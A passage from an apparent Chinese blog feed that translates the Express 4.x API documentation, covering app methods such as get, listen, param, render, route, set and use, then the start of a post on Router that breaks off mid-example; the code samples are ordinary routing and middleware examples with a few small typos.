class="built_in">require</span>(<span class="string">'ejs'</span>).renderFile);</span><br></pre></td></tr></table></figure><p>在这个例子中，ejs提供了一个<code>.renderFile</code>方法，这个方法满足了Express规定的签名规则：(path, options, callback)，然而记住在内部它只是<code>ejs.__express</code>的一个别名，所以你可以在不做任何事的情况下直接使用.ejs扩展。一些模板引擎没有遵循这种规范，<code>consolidate.js</code>库映射模板引擎以下面的使用方式，所以他们可以无缝的和Express工作。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> engines = <span class="built_in">require</span>(<span class="string">'consolidate'</span>);</span><br><span class="line">app.engine(<span class="string">'haml'</span>,engines.haml);</span><br><span class="line">app.engine(<span class="string">'html'</span>,engines.hogan);</span><br></pre></td></tr></table></figure><h3 id="app-get-name"><a href="#app-get-name" class="headerlink" title="app.get(name)"></a>app.get(name)</h3><p>获得设置名为name的app设置的值，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个。 如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'title'</span>);  <span class="comment">// =&gt; undefined</span></span><br><span class="line">app.set(<span class="string">'title'</span>,<span class="string">'My site'</span>);</span><br><span class="line">app.get(<span class="string">'title'</span>)  <span class="comment">// 'My site'</span></span><br></pre></td></tr></table></figure><h3 id="app-get-path-callback-callback-…"><a href="#app-get-path-callback-callback-…" class="headerlink" title="app.get(path, callback [, callback …])"></a>app.get(path, callback [, callback …])</h3><p>使用指定的回调函数将HTTP请求路由到指定的路径。获取跟多的信息，可以查阅<a href="http://expressjs.com/guide/routing.html" target="_blank" rel="noopener">routing guide</a>。你可以提供多个回调函数，他们的内容和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果请求没能满足当前路由的处理条件，那么传递控制到随后的路由。</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">app.<span class="built_in">get</span>(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="title">req</span>,<span class="title">res</span>)&#123;</span></span><br><span class="line">    res.<span class="built_in">send</span>(<span class="string">'GET request to homepage'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="app-listen-port-hostname-backlog-callback"><a href="#app-listen-port-hostname-backlog-callback" class="headerlink" title="app.listen(port, [hostname], [backlog], [callback])"></a>app.listen(port, [hostname], [backlog], [callback])</h3><p>绑定程序监听端口到指定的<code>主机</code>和<code>端口号</code>。这个方法和Node中的<a href="http://nodejs.org/api/http.html#http_server_listen_port_hostname_backlog_callback" target="_blank" rel="noopener">http.Server.listen()</a>是一样的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>通过调用express()返回得到的app实际上是一个JavaScript的Function，被设计用来作为一个回调传递给<code>NODE HTTP servers</code>来处理请求。这样，其就可以很简单的基于同一份代码提供的http和https版本，所以app没有从这些继承（它只是一个简单的回调）。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>);</span><br><span class="line"><span class="keyword">var</span>  http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(app).listen(<span class="number">80</span>);</span><br><span class="line">http.createServer(options,app).listen(<span class="number">443</span>)</span><br></pre></td></tr></table></figure><p>app.listen()方法是下面所示的一个便捷的方法（只针对HTTP协议）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.listen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> server = http.createServer(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> server.listen.apply(server, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="app-METHOD-path-callback-callback-…"><a href="#app-METHOD-path-callback-callback-…" class="headerlink" title="app.METHOD(path,callback [,callback …])"></a>app.METHOD(path,callback [,callback …])</h3><p>路由HTTP请求，METHOD是这个请求的HTTP方法，比如GET,POST,PUT等等，小写。所以，实际方法是app.get,app.post,app.put等等，下面有关于方法完整的表。</p><p>获取更多信息，请看<a href="http://expressjs.com/guide/routing.html" target="_blank" rel="noopener">routing guide</a>。 Express支持下面的路由方法，对应与同名的HTTP方法：</p><p>具体见<a href="http://www.expressjs.com.cn/4x/api.html#app.METHOD" target="_blank" rel="noopener">app.METHOD</a></p><blockquote><p>如果使用上述方法时，导致了无效的JavaScript变量名，可以使用中括号，比如：app[‘m-search’](‘/‘, function ….</p></blockquote><p>你可以提供多个回调函数，它们的行为和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果请求没有满足当前路由的处理条件，那么传递控制到随后的路由。（我的话：”！这一段看了好几遍啦- -，理解next传递非常重要性”）</p><blockquote><p>本API文档把使用比较多的HTTP方法app.get()，app.post，app.put()，app.delete()作为一个个单独的项进行说明。然而，其他上述列出的方法以完全相同的方式工作。</p></blockquote><p>有一种特殊的路由方法，<code>app.all()</code>，这不是来自任何HTTP方法。他在所有请求方法的路径上加载中间件，其对于所有的方法都有效</p><h3 id="app-param-name-callback"><a href="#app-param-name-callback" class="headerlink" title="app.param([name],callback)"></a>app.param([name],callback)</h3><p>给路由参数添加回调触发器，这里的name是参数名或者参数数组，function是回调方法。回调方法的参数按序是请求对象，响应对象，下个中间件，参数值和参数名。 如果name是数组，会按照各个参数在数组中被声明的顺序将回调触发器注册下来。还有，对于除了最后一个参数的其他参数，在他们的回调中调用next()来调用下个声明参数的回调。只有一个参数，那么就是最后一个参数，和数组中最后一个参数是一样的。 例如，当:user出现在路由路径中，你可以映射用户加载的逻辑处理来自动提供req.user给这个路由，或者对输入的参数进行验证。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.param(<span class="string">'user'</span><span class="function">.<span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试从用户模型获取用户详细信息并将其附加到请求对象</span></span><br><span class="line">    User.find(id,<span class="function"><span class="keyword">function</span>(<span class="params">err,user</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            next(err);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(user)&#123;</span><br><span class="line">            req.user = user;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            next(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'fail to load user'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>对于Param的回调定义的路由来说，他们是局部的。它们不会被挂载的app或者路由继承。所以，定义在app上的Param回调只有是在app上的路由具有这个路由参数时才起作用。</p><p>在定义param的路由上，param回调都是第一个被调用的，它们在一个请求-响应循环中都会被调用一次并且只有一次，即使多个路由都匹配，如下面的栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.param(<span class="string">'id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'CALLED ONLY NOCE'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'although this match'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'and this matches too'</span>);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当GET/user/42,得到下面结果</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">CALLED ONLY NOCE</span><br><span class="line">although <span class="keyword">this</span> matches</span><br><span class="line">and <span class="keyword">this</span> matches too</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.param([<span class="string">'id'</span>,<span class="string">'page'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'CALLED ONLY ONCE with'</span>,value);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/user/:id/:page'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'although this matches'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/user/:id/:page'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'and this matchs too'</span>);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当执行GET /user/42/3，结果如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">CALLED ONLY ONCE <span class="keyword">with</span> <span class="number">42</span></span><br><span class="line">CALLED ONLY ONCE <span class="keyword">with</span> <span class="number">3</span></span><br><span class="line">although <span class="keyword">this</span> matches</span><br><span class="line">and <span class="keyword">this</span> mathes too</span><br></pre></td></tr></table></figure><blockquote><p>下面章节描述的app.param(callback)在v4.11.0之后被弃用。</p></blockquote><p>通过只传递一个回调参数给app.param(name, callback)方法，app.param(naem, callback)方法的行为将被完全改变。这个回调参数是关于app.param(name, callback)该具有怎样的行为的一个自定义方法，这个方法必须接受两个参数并且返回一个中间件。 这个回调的第一个参数就是需要捕获的url的参数名，第二个参数可以是任一的JavaScript对象，其可能在实现返回一个中间件时被使用。 这个回调方法返回的中间件决定了当URL中包含这个参数时所采取的行为。 </p><p>在下面的例子中，app.param(name, callback)参数签名被修改成了app.param(name, accessId)。替换接受一个参数名和回调，app.param()现在接受一个参数名和一个数字。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义app.param()的行为</span></span><br><span class="line">app.param(<span class="function"><span class="keyword">function</span>(<span class="params">param,option</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(val == option)&#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.sendStatus(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用定制的app.param()</span></span><br><span class="line">app.param(<span class="string">'id'</span>,<span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发捕获的路由</span></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'OK'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Ready'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.param(<span class="function"><span class="keyword">function</span>(<span class="params">param,validator</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(validator(val))&#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.sendStatus(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.param(<span class="string">'id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">candidate</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">isNaN</span>(<span class="built_in">parseFloat</span>(candidate)) &amp;&amp; <span class="built_in">isFinite</span>(candidate);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>在使用正则表达式，不要使用.。例如，你不能使用/user-.+/来捕获user-gami，用使用[\s\S]或者[\w\&gt;W]来代替(正如/user-[\s\S]+/)。</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//captures '1-a_6' but not '543-azser-sder'</span></span><br><span class="line">router.get(<span class="string">'/[0-9]+-[[\\w]]*'</span>, <span class="function"><span class="keyword">function</span>); </span></span><br><span class="line"><span class="function">//<span class="title">captures</span> '1-<span class="title">a_6</span>' <span class="title">and</span> '543-<span class="title">az</span>(<span class="params">ser<span class="string">"-sder' but not '5-a s'</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">router.get('/[0-9]+-[[\\S]]*', function); </span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">//captures all (equivalent to '.*')</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">router.get('[[\\s\\S]]*', function);</span></span></span></span><br></pre></td></tr></table></figure><h3 id="app-path"><a href="#app-path" class="headerlink" title="app.path()"></a>app.path()</h3><p>返回应用程序的规范路径（字符串）</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">app</span> = express()</span><br><span class="line">  , blog = express()</span><br><span class="line">  , blogAdmin = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">app</span>.<span class="keyword">use</span>('/blog', blog);</span><br><span class="line">blog.<span class="keyword">use</span>('/admin', blogAdmin);</span><br><span class="line"></span><br><span class="line">console.<span class="built_in">log</span>(<span class="keyword">app</span>.path()); <span class="comment">// ''</span></span><br><span class="line">console.<span class="built_in">log</span>(blog.path()); <span class="comment">// '/blog'</span></span><br><span class="line">console.<span class="built_in">log</span>(blogAdmin.path()); <span class="comment">// '/blog/admin'</span></span><br></pre></td></tr></table></figure><p>如果app挂载很复杂下，那么这个方法的行为也会很复杂：一种更好用的方式是使用<code>req.baseUrl</code>来获得这个app的典型路径。</p><h3 id="app-post-path-callback-callback-…"><a href="#app-post-path-callback-callback-…" class="headerlink" title="app.post(path, callback, [callback …])"></a>app.post(path, callback, [callback …])</h3><p>使用指定的回调函数将HTTP POST请求路由到指定的路径。有关更多信息，请参见<a href="http://www.expressjs.com.cn/guide/routing.html" target="_blank" rel="noopener">routing guide</a>。</p><p>你可以提供多个回调函数，它们的行为和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果请求没能满足当前路由的处理条件，那么传递控制到随后的路由</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'POST request to homepage'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="app-put-path-callback-callback-…"><a href="#app-put-path-callback-callback-…" class="headerlink" title="app.put(path, callback [, callback …])"></a>app.put(path, callback [, callback …])</h3><p>使用指定的回调函数将HTTP PUT请求路由到指定的路径。有关更多信息，请参见<a href="http://www.expressjs.com.cn/guide/routing.html" target="_blank" rel="noopener">routing guide</a>。</p><p>你可以提供多个回调函数，它们的行为和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果请求没能满足当前路由的处理条件，那么传递控制到随后的路由</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.put(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">'PUT request to homepage'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="app-render-view-locals-callback"><a href="#app-render-view-locals-callback" class="headerlink" title="app.render(view, [locals], callback)"></a>app.render(view, [locals], callback)</h3><p>通过回调函数返回视图的呈现HTML,它可以接受一个可选的参数，可选参数包含了这个view需要用到的本地数据。这个方法类似于res.render()，除了它不能把渲染得到的HTML文本发送给客户端。</p><blockquote><p>将app.render()当作是可以生成渲染视图字符串的工具方法。在res.render()内部，就是使用的app.render()来渲染视图。</p></blockquote><blockquote><p>如果使能了视图缓存，那么本地变量缓存就会保留。如果你想在开发的过程中缓存视图，设置它为true。在生产环境中，视图缓存默认是打开的。</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.render(<span class="string">'email'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, html</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.render(<span class="string">'email'</span>, &#123; <span class="attr">name</span>: <span class="string">'Tobi'</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, html</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="app-route-path"><a href="#app-route-path" class="headerlink" title="app.route(path)"></a>app.route(path)</h3><p>返回一个单例模式的路由的实例，之后你可以在其上施加各种HTTP动作的中间件。使用app.route()来避免重复路由名字</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/events'</span>)</span><br><span class="line">.all(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// runs for all HTTP verbs first</span></span><br><span class="line">  <span class="comment">// think of it as route specific middleware!</span></span><br><span class="line">&#125;)</span><br><span class="line">.get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.json(...);</span><br><span class="line">&#125;)</span><br><span class="line">.post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// maybe add a new event...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="app-set-name-value"><a href="#app-set-name-value" class="headerlink" title="app.set(name, value)"></a>app.set(name, value)</h3><p>给 name 设置项赋 value 值，name 是 <a href="http://www.runoob.com/w3cnote/express-4-x-api.html#app.settings.table" target="_blank" rel="noopener">Application settings</a> 中属性的一项。 </p><p>对于一个类型是布尔型的属性调用app.set(‘foo’, ture)等价于调用app.enable(‘foo’)。同样的，调用app.set(‘foo’, false)等价于调用app.disable(‘foo’)。</p><p>可以使用app.get()来取得设置的值：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.set(<span class="string">'title'</span>, <span class="string">'My Site'</span>);</span><br><span class="line">app.get(<span class="string">'title'</span>); <span class="comment">// 'My Site'</span></span><br></pre></td></tr></table></figure><h4 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h4><p>如果name是程序设置之一，它将影响到程序的行为。下边列出了程序中的设置。<br>见 <a href="http://www.expressjs.com.cn/4x/api.html#app.set" target="_blank" rel="noopener">app.set</a></p><h3 id="app-use-path-function-function…"><a href="#app-use-path-function-function…" class="headerlink" title="app.use([path,] function [, function…])"></a>app.use([path,] function [, function…])</h3><p>挂载中间件方法到路径上。如果路径未指定，那么默认为”/“。</p><blockquote><p>一个路由将匹配任何路径如果这个路径以这个路由设置路径后紧跟着”/“。比如：app.use(‘/appale’, …)将匹配”/apple”，”/apple/images”，”/apple/images/news”等。</p></blockquote><blockquote><p>中间件中的req.originalUrl是req.baseUrl和req.path的组合，如下面的例子所示。</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="string">'/admin'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// GET 'http://www.example.com/admin/new'</span></span><br><span class="line">  <span class="built_in">console</span>.log(req.originalUrl); <span class="comment">// '/admin/new'</span></span><br><span class="line">  <span class="built_in">console</span>.log(req.baseUrl); <span class="comment">// '/admin'</span></span><br><span class="line">  <span class="built_in">console</span>.log(req.path); <span class="comment">// '/new'</span></span><br><span class="line">  next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在一个路径上挂载一个中间件之后，每当请求的路径的前缀部分匹配了这个路由路径，那么这个中间件就会被执行。 由于默认的路径为/，中间件挂载没有指定路径，那么对于每个请求，这个中间件都会被执行</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 此中间件将不允许请求超出它的范围。</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Time: %d'</span>, <span class="built_in">Date</span>.now());</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>路径(path)可以是表示路径的字符串、路径模式、匹配路径的正则表达式或其组合数组</p><p>下面是中间件的简单示例：</p><p>具体见<a href="http://www.expressjs.com.cn/4x/api.html#app.use" target="_blank" rel="noopener">app.use</a></p><p>下面是一些例子，在Express程序中使用express.static中间件。<br>为程序托管位于程序目录下的public目录下的静态资源：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET /style.css etc</span></span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br></pre></td></tr></table></figure><p>在/static路径下挂载中间件来提供静态资源托管服务，只当请求是以/static为前缀的时候。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET /static/style.css etc.</span></span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(express.__dirname + <span class="string">'/public'</span>));</span><br></pre></td></tr></table></figure><p>通过在设置静态资源中间件之后加载日志中间件来关闭静态资源请求的日志。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">app.use(logger());</span><br></pre></td></tr></table></figure><p>托管静态资源从不同的路径，但./public路径比其他更容易被匹配：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/files'</span>));</span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/uploads'</span>));</span><br></pre></td></tr></table></figure><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>Express文档核心的四大部分app，request，response，router，到此已经完成。简单的总结</p><ol><li><p>通过调用express()返回得到的app实际上是一个JavaScript的Function，它是一个Express的应用实例；app对象具有HTTP请求，配置中间件，渲染HTML视图，注册模板引擎这四大功能。它还有一些属性设置，这些属性可以改变程序的行为</p></li><li><p>request对象即表示HTTP请求，包含了请求查询字符串，参数，内容，HTTP头等属性</p></li><li><p>response对象则表示HTTP响应，即在受到请求时向客户端发送的HTTP响应数据</p></li><li><p>每个Express程序有一个内建的app路由，顶层的express对象有一个Router()方法，你可以使用Router()来创建一个新的router对象，你可以把它当做一个<code>mini-application</code>，它具有操作路由和中间件的能力，有些方法和app类同</p></li></ol><p>到此<code>Express4.x API 译文 系列文章</code>已经完成。<br>本人学识有限，难免有所纰漏或者理解不当之处，翻译仅仅是方便个人学习交流使用，无其他用意（如果有不妥之处，请联系本人删除），原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">expressjs.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
            <tag> Express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express4.x API (四)：Router (译)</title>
      <link href="/2017/12/23/express-api-cn-router/"/>
      <url>/2017/12/23/express-api-cn-router/</url>
      
        <content type="html"><![CDATA[<h1 id="Express4-x-API-译文-系列文章"><a href="#Express4-x-API-译文-系列文章" class="headerlink" title="Express4.x API 译文 系列文章"></a>Express4.x API 译文 系列文章</h1><ul><li><a href="http://www.cnblogs.com/okaychen/p/8108405.html" target="_blank" rel="noopener">Express4.x API (一)：application (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8081275.html" target="_blank" rel="noopener">Express4.x API (二)：request (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8087425.html" target="_blank" rel="noopener">Express4.x API (三)：Response (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8093717.html" target="_blank" rel="noopener">Express4.x API (四)：router (译) – 完成</a><a id="more"></a>已经完成了Express4.x API中的Requst和Response对象的文档翻译。简单的总结，request对象即表示HTTP请求，包含了请求查询字符串，参数，内容，HTTP头等属性；response对象则表示HTTP响应，即在受到请求时向客户端发送的HTTP响应数据。Express则基于此提供给我们一些方法，完成指定的请求和响应。</li></ul><p>技术库更迭较快，很难使译文和官方的API保持同步，我们只有提升自己的英语能力才能更快的适应库的更新迭代,阅读到最新资料。<br>所以我此次翻译的目的，一是熟悉express文档，二是锻炼自己英语阅读能力；</p><blockquote><p>原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">express.com</a></p></blockquote><h1 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h1><p><code>router</code>对象是中间件和路由的隔离实例，你可以把它看做一个仅能执行中间件和路由功能的<code>mini-applaction</code>，每一个Express应用程序实例都有一个内置的路由器</p><p>路由器的行为类似于中间件本身，所以你可以把他作为一个参数传递给<code>app.use()</code>或者作为参数传递给另一个路由器的<code>use()</code>方法</p><p><code>top-level</code> express 对象有一个Router()创建一个新的路由器对象</p><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><h3 id="Router-options"><a href="#Router-options" class="headerlink" title="Router([options])"></a>Router([options])</h3><p>创建一个新的路由器对象</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var router</span> = express.Router([options]);</span><br></pre></td></tr></table></figure><p>可选择的options参数指定路由器的行为<br>|Property|Description|Default|Availability|<br>|—|—|—|—|<br>|caseSensitive|是否启用大小写敏感|默认情况下不敏感，以相同的方式对待”/Foo”,”/foo”| |<br>|mergeParams|从父路由器保存<code>req.params</code>值，如果子父有冲突的参数名称，以子路由参数优先|false|4.5.0+|<br>|strict|启用严格路由|默认情况下是禁用的，”/foo”和”/foo/“是相同的| |</p><p>你可以像应用程序那样添加中间件和HTTP方法路由（例如get，put，post等等）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用传递给次路由的任何请求</span></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 一些逻辑，和其他中间件一样</span></span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将会处理任何以/events结束的请求</span></span><br><span class="line">router.get(<span class="string">'/events'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后你可以为你特定的URL使用路由器，用这种方式把你的routes分为文件甚至是<code>mini-apps</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="string">'/calendar'</span>,router);</span><br></pre></td></tr></table></figure><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><h3 id="routers-all-path-callback-…-callback"><a href="#routers-all-path-callback-…-callback" class="headerlink" title="routers.all(path,[callback,…] callback)"></a>routers.all(path,[callback,…] callback)</h3><p>这个方法就像<code>router.METHHOD()</code>,除了他匹配所有的HTTP方法</p><p>这个方法对于映射特定路径前缀或任意匹配的”全局”逻辑非常有用。举个栗子，如果你将以下路由置于所有路由的最前面，它要求从该点的所有路由都需要身份认证，并自动加载user。记住这些回调函数不必作为终点，<code>loadUser</code>可以执行任务，然后通过<code>next()</code>传递继续匹配给后续的路由</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.all(<span class="string">'*'</span>,requireAuthentication,loadUser);</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.all(<span class="string">'*'</span>,requireAuthentication)</span><br><span class="line">router.all(<span class="string">'*'</span>,loadUser)</span><br></pre></td></tr></table></figure><p>另一个例子是<code>white-listed</code>“global”功能，这里的例子非常的相似，但是它只限制路径的前缀”/api”</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.all(<span 